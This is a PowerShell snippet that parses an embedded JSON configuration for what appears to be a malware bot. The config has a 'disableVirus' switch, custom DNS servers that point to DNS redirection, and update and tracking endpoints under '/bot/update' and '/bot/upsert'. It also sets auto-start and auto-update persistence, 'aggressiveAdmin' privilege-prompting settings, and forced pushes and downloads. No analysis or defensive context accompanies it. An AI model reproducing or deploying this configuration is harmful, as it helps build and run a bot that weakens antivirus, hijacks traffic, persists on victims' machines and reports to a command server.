
$server = @'
{
  "version": "2026.04.19 17:55:04",
  "urlDoc": "",
  "disabled": false,
  "disableVirus": false,
  "serverIp": "26.188.115.1",
  "server": "default",
  "primaryDns": "26.188.115.1",
  "secondaryDns": "192.168.30.77",
  "extraUpdate": false,
  "updateUrl": "http://123/bot/update",
  "track": true,
  "trackDesktop": false,
  "trackUrl": "http://123/bot/upsert",
  "autoStart": true,
  "autoUpdate": true,
  "aggressiveAdmin": true,
  "aggressiveAdminDelay": 1,
  "aggressiveAdminAttempts": 0,
  "aggressiveAdminTimes": 0,
  "pushesForce": true,
  "pushes": [],
  "startDownloadsForce": true,
  "startDownloads": [],
  "startUrlsForce": false,
  "startUrls": [],
  "frontForce": false,
  "front": [],
  "embeddingsForce": false,
  "embeddings": []
}
'@ | ConvertFrom-Json
